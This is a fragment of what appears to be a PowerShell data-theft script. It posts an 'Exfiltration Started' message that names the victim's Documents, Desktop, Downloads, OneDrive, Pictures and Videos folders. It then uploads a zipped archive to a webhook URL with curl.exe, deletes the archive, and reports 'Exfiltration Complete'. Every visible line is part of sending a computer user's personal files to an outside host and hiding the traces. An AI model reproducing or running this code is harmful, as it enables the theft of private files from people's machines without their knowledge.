...
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Started..`` :file_folder:
$env:USERPROFILE\Documents 
$env:USERPROFILE\Desktop
$env:USERPROFILE\Downloads
$env:USERPROFILE\OneDrive
$env:USERPROFILE\Pictures
$env:USERPROFILE\Videos"} | ConvertTo-Json
...
curl.exe -F file1=@"$zipFilePath" $hookurl
Remove-Item -Path $zipFilePath -Force
$cmp = @{"username" = "$env:COMPUTERNAME" ;"content" = "Exfiltration Complete."} | ConvertTo-Json
